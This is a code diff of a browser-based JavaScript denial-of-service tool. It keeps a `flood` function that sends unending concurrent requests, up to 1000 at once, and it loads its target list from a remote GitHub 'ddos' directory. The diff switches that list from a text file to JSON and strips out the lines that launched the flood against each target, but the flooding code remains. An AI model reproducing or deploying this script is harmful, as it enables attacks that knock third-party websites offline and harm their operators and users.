@@ -2,13 +2,16 @@
 const ERROR_SYMBOL = "❌";
 const SUCCESS_SYMBOL = "✔️"
 const NO_RESPONSE_SYMBOL = "☠️";
-let targetsURL = 'https://raw.githubusercontent.com/anondevua/anondevua.github.io/main/ddos/targets.txt';
+const targetsURL = 'https://raw.githubusercontent.com/anondevua/anondevua.github.io/main/ddos/';
 const updateInterval = 500;
 const fetchTimeout = 1000;
 const CONCURRENCY_LIMIT = 1000;
 const RESULTS_NUM = 10
+
 var targetStats = {}
 var statsEl = document.getElementById('stats');
+var descEl = document.getElementById('description');
+
 function printStats() {
     for (var [target, stats] of Object.entries(targetStats)) {
         stats.last_responses = stats.last_responses.slice(-RESULTS_NUM)
@@ -27,6 +30,7 @@ function printStats() {
     statsEl.innerHTML = '<table width="100%"><thead><tr><th>URL</th><th>Number of Requests</th><th>Number of Errors</th><th>Responses</th></tr></thead><tbody>' + table_body + '</tbody></table>'
 }
 setInterval(printStats, updateInterval);
+
 var queue = []
 async function fetchWithTimeout(resource, options) {
     const controller = new AbortController();
@@ -43,6 +47,7 @@ async function fetchWithTimeout(resource, options) {
         throw error;
     });
 }
+
 async function flood(target) {
     for (var i = 0; ; ++i) {
         if (queue.length > CONCURRENCY_LIMIT) {
@@ -71,16 +76,9 @@ async function flood(target) {
         )
     }
 }
-fetch(targetsURL).then((r) => {
-    r.text().then((d) => {
-        let targets = d.split('\n');
-        targets.forEach((target) => {
-            targetStats[target] = {
-                number_of_requests: 0,
-                number_of_errored_responses: 0,
-                last_responses: []
-            }
-        })
-        targets.map(flood)
+
+fetch(targetsURL + "targets.json").then((r) => {
+    r.json().then((d) => {
+        console.log(d);
     })
 })
